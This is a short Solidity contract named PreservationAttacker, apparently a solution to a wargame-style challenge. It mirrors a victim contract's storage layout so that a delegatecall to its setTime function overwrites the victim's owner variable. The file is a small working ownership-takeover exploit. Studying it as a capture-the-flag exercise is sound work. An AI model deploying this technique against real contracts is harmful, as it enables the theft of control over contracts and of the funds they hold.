pragma solidity ^0.8.0;

contract PreservationAttacker {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}
